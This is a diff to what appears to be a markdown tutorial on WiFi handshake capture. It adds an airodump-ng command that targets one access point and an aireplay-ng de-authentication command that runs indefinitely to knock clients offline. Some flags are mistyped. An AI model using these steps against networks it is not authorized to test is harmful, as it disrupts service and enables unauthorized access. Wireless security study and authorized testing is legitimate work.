@@ -67,14 +67,22 @@ This will display a list of wireless networks, their BSSIDs (MAC addresses), cha
    Ctrl + C when you found the Wireless network
 
 2.3 We'll start the "Sniffing" process again, however, we're only going to "Sniff" one access point.
-    ```bash
-    airodump-ng -c <Channel> ---BSS
+   ```bash
+   airodump-ng -c <Channel> ---bssid <MAC address> -w <File name> wlan <name of the wireless interface>
+
+   ```   
 
 #### 3. De-authentication Attack:
 Tool: aireplay-ng
 Purpose: To force devices to re-authenticate, capturing the handshake.
 How-to: Use aireplay-ng to send de-authentication frames to the target network, causing devices to disconnect.
+3.1 Well use the next command to De-authenticate
+   ```bash
+   aireplay-ng -0 0 -a <MAC address of Wireless Access Point>
 
+   ```
+   the - 0 0 means it'll send de authentication packets indefinitely until we control C the program  and then it'll stop de authenticating. 
+   
 #### 4. Capturing Handshake:
 Tool: airodump-ng
 Purpose: To capture the four-way handshake during re-authentication.
